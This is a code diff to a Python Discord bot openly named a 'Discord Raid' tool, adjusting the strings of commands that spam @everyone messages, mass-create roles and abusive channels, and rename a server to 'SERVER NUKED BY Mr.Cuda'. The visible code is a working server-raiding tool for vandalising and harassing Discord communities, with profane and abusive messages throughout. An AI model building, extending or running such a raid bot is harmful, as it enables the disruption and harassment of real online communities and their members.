@@ -26,19 +26,17 @@ else:
 SPAM_CHANNEL = ["LMAO RAIDED BY Mr.Cuda", "FUCKED UP"]
 SPAM_MESSAGE = ["@everyone I love this raid", "@everyone" "]
 webhook_usernames = [
-    "LOSER", "SERVER FUCKED UP", "Mr.Cuda fucked up with u",
+    "LOSER", "SERVER FUCKED UP", "Bro got raid",
     "LOL",
-    "RTX-4050"
 ]
 client = commands.Bot(command_prefix="!", intents=intents)
 
 @client.event
 async def on_ready():
     print('''
-i'm ready :)
-Discord Raid made by Mr.Cuda
+Discord Raid made by Mr.Cuda :)
  ''')
-    await client.change_presence(activity=discord.Game(name="what am I doing?"))
+    await client.change_presence(activity=discord.Game(name="what is this?"))
 
 
 @client.command()
@@ -67,7 +65,7 @@ async def nukeserver(ctx):
     for role in guild.roles:
         try:
             await ctx.guild.create_role(name="Fucked up")
-            print("Senpai")
+            print("role created successfully")
         except:
             print("failed to spam a role")
     await guild.create_text_channel("FUCK YOU")
@@ -93,7 +91,7 @@ async def nukename(ctx):
     guild = ctx.message.guild
     await ctx.guild.edit(name="SERVER NUKED BY Mr.Cuda")
     print("Name Changed")
-    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#:RAID: "
+    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
     lattersL = latters.split()
 
 
